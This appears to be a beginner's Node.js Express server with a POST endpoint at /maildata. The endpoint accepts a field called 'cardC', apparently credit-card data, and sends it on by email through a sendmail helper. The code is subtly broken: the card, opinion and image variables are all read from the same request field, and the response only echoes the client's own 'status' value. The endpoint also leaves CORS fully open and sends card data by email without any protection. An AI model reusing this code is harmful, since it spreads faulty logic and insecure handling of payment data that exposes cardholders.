const express=require('express');
const path=require('path');
const bodyparser=require('body-parser');
const cors=require('cors');
const morgan=require('morgan');


const app=express();
app.use(morgan('combined'));
app.use(bodyparser.json());
app.use(cors());
let port =8081;

const email =require('./sendmail')

//save data via email
app.post('/maildata',(req,res)=>{
   
     let cardCredit=req.body.cardC;
     let opinion=req.body.cardC;
     let image=req.body.cardC
     const emailSended=email.sendMailService(cardCredit,opinion,image)
	
    	// req.send({
    	// 	success:true,
    	// 	message:'Post saved successfully!'
    	// })
        res.send(
        [{
       status:req.body.status
        }]
        )
    })  

// app.get('/posts', (req, res) => {
//   res.send(
//     [{
//       title: "Hello World!",
//       description: "Hi there! How are you?"
//     }]
//   )
// })










app.listen(port,(s)=>{
	console.log(`app runing with port ${port}`)
})
//app.listen(process.env.PORT || 8081)